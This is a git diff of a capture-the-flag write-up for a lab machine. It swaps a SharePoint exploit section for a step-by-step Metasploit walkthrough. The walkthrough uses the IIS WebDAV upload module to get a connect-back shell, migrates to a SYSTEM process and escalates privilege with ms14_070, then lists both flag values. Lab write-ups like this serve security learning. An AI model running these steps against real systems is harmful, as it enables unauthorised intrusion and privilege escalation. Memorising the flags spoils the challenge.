@@ -35,6 +35,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 25.73 seconds
 ```
 * Looks like theres a webserver on port 80
+* We can see that WebDAV is running
 
 ### Gobuster
 `gobuster dir -u http://10.10.10.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobusterScan.txt`
@@ -119,19 +120,33 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-* Nothing too interesting here
+* We can look at `/_vti_inf.html` for some extra info
+	* Looking at the html source, it says `<!-- _vti_inf.html version 0.100>` and `FPVersion="5.0.2.6790"`
+* `_vti_bin/fpcount.exe` apparently might let us execute arbitrary commands
 
 # Exploitation
 
-### sharepoint
-
-* Let's use the [MS10-104 Microsoft Office SharePoint Server 2007 Remote Code Execution](https://hackmag.com/security/sharepoint-serving-the-hacker/) exploit
-  
-* Note: `10.10.14.19` should be replaced with your own ip (i used the one on my vpn tun0 interface)
+### webdav
+* On `msfconsole`, we can run the following:
+1. `search webdav`
+2. `use exploit/windows/iis/iis_webdav_upload_asp` in order to get remote code execution
+3. `set RHOST 10.10.10.15`
+4. `set LHOST tun0` in order to have the machine connect back to yours
+5. `run`
+6. `ps` to find processes running with `NT AUTHORITY`
+7. `migrate 3416` (pick the process id that your machine is running as described above)
+8. `bg` to put the session into the background (keep note of the number)
+9. `use post/multi/recon/local_exploit_suggester` in order to find scripts for privesc
+10. `set SESSION 1` (use whatever session number your session was backgrounded to)
+11. `set SHOWDESCRIPTION true` to see more details for each suggestion
+12. `run`
+13. `use exploit/windows/local/ms14_070_tcpip_ioctl` because we want to elevate the system
+14. `set SESSION 1`
+15. `set LHOST tun0`
+16. `run`
 ```
-search sharepoint
-use exploit/windows/misc/ms10_104_sharepoint
-options
-set RHOST 10.10.10.15
-set LHOST 10.10.14.19
+* Now, we should have admin access. If not, go through the process and migrate steps again
+* We can cd to `C:\Documents and Settings\Lakis\Desktop`
+	* Using the `cat` command on the meterpreter or the `more` command on the shell, we get the user flag: `700c5dc163014e22b3e408f8703f67d1`
 
+* We can cd to `C:\Documents and Settings\Administrator\Desktop>` to get the root flag: `aa4beed1c0584445ab463a6747bd06e9`
